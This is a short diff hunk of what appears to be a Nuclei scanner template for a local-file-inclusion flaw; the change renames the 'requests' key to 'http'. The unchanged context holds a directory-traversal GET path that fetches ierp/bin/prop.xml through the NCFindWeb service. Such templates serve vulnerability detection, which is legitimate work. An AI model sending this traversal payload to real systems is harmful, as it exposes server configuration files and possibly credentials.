@@ -11,7 +11,7 @@ info:
     such as COFCO/Minsheng E-commerce/Tsinghua University/Aigo)
   tags: lfi,wooyun
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
